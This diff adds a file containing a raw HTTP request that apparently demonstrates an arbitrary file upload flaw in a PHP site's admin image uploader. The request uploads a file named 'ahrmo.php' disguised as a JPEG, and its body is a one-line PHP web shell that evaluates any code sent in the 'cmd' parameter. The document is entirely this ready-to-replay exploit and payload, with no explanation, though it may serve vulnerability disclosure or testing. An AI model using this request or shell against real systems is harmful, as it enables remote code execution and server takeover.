@@ -1,0 +1,29 @@
+POST /admin.php/index/upload.html?dir=image HTTP/1.1
+Host: localhost
+Content-Length: 331
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1i2xqaNpj1aRQvMS
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: iframe
+Referer: http://localhost/admin.php/post/add/cid/6.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_id=menu_19; url=%2Fadmin.php%2Fcate%2Fpost.html
+Connection: close
+
+------WebKitFormBoundary1i2xqaNpj1aRQvMS
+Content-Disposition: form-data; name="localUrl"
+
+C:\fakepath\ahrmo.jpg
+------WebKitFormBoundary1i2xqaNpj1aRQvMS
+Content-Disposition: form-data; name="imgFile"; filename="ahrmo.php"
+Content-Type: image/jpeg
+
+<?php @eval($_POST['cmd']);?>
+------WebKitFormBoundary1i2xqaNpj1aRQvMS--
